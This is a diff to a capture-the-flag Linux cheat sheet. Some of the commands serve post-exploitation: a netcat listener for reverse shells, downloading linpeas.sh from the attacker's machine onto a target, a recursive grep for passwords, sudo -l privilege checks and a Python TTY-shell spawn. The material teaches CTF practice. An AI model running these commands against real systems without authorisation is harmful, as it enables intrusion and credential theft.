@@ -13,6 +13,7 @@
 | `cd -` | Go back to the *previous* directory you were in. |
 | `find . -name "flag.txt"` | Find a specific file in the current folder. |
 | `find / -name "flag.txt" 2>/dev/null` | Find a file across the **whole system** (ignoring errors). |
+| `grep -r "password" .` | Search for a specific text string inside **all** files in the folder. |
 | `locate filename` | Faster search (uses a pre-built database). |
 | `which python3` | Shows the path to a binary/program. |
 
@@ -30,24 +31,27 @@
 | Command | Description |
 | :--- | :--- |
 | `ip a` | Show your IP address and interfaces. |
+| `curl ifconfig.me` | Show your **Public** IP address. |
 | `ping -c 4 8.8.8.8` | Test connectivity (stop after 4 pings). |
 | `netstat -antp` | Show all active connections and open ports. |
 | `ss -tulpn` | Faster version of netstat (Listening ports). |
 | `nc -lvnp 4444` | Start a **Netcat Listener** (Wait for a reverse shell). |
 | `nc <target_ip> <port>` | Connect to a remote port manually. |
 
-### 📥 File Transfer (Getting exploits onto the target)
+### 📥 File Transfer
 *When you have a shell but need to upload a script.*
 
 **1. Python Web Server (Run this on YOUR machine)**
-
-    python3 -m http.server 8000
+```bash
+python3 -m http.server 8000
+```
 
 **2. Download command (Run this on the TARGET)**
-
-    wget http://<your_ip>:8000/linpeas.sh
-    # OR
-    curl http://<your_ip>:8000/linpeas.sh -o linpeas.sh
+```bash
+wget http://<your_ip>:8000/linpeas.sh
+# OR
+curl http://<your_ip>:8000/linpeas.sh -o linpeas.sh
+```
 
 ### ⚡ Permission & Execution
 | Command | Description |
@@ -57,6 +61,7 @@
 | `sudo -l` | Check what you can run as `root` (Privilege Escalation check). |
 | `id` | Show current user ID and group memberships. |
 | `w` | See who else is logged into the system. |
+| `uname -a` | Show kernel and system information. |
 
 ### 🔐 Archives & Compression
 | Command | Description |
@@ -68,17 +73,22 @@
 
 ### 🥷 CTF "Magic" Tricks
 * **Base64 Decode:**
-
-        echo "SGVsbG8=" | base64 -d
-
+    ```bash
+    echo "SGVsbG8=" | base64 -d
+    ```
 * **MD5 Hash a file:**
-
-        md5sum file.txt
-
+    ```bash
+    md5sum file.txt
+    ```
 * **Watch a command (Auto-refresh):**
-
-        watch -n 1 'ls -la'
-
+    ```bash
+    watch -n 1 'ls -la'
+    ```
 * **Re-run last command as sudo:**
-
-        sudo !!
+    ```bash
+    sudo !!
+    ```
+* **Spawn a TTY Shell (Python):**
+    ```bash
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    ```
